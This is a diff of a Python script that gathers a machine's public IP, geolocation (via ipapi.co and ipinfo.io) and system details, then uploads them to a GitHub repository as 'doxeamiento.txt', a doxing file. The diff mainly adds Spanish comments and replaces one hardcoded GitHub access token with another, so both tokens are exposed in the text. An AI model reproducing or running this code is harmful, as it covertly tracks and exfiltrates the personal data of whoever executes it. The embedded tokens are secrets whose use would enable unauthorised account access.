@@ -36,10 +36,12 @@ def gip():
         return None
 def gloc(ip):
     try:
+        # Intentar con ipapi.co
         response = requests.get(f"https://ipapi.co/{ip}/json/")
         data = response.json()
         if "error" in data:
             raise Exception("ipapi.co falló")
+
         return {
             "País": data.get("country_name"),
             "Ciudad": data.get("city"),
@@ -49,10 +51,12 @@ def gloc(ip):
         }
     except:
         try:
+            # Intentar con ipinfo.io si ipapi.co falla
             response = requests.get(f"https://ipinfo.io/{ip}/json")
             data = response.json()
-            if "bogon" in data:
+            if "bogon" in data:  # IP privada/no rastreable
                 return None
+
             lat, lon = data.get("loc", ",").split(",")
             return {
                 "País": data.get("country"),
@@ -82,7 +86,7 @@ def gsys():
         "Ubicación": ubicacion if ubicacion else "No disponible"
     }
     return info
-github = github(token='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', owner='mrmorcilla', repo='python')
+github = github(token='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', owner='mrmorcilla', repo='python')
 system_info = gsys()
 texto=json.dumps(system_info, indent=4, ensure_ascii=False)
 res=github.write('doxeamiento.txt',texto)
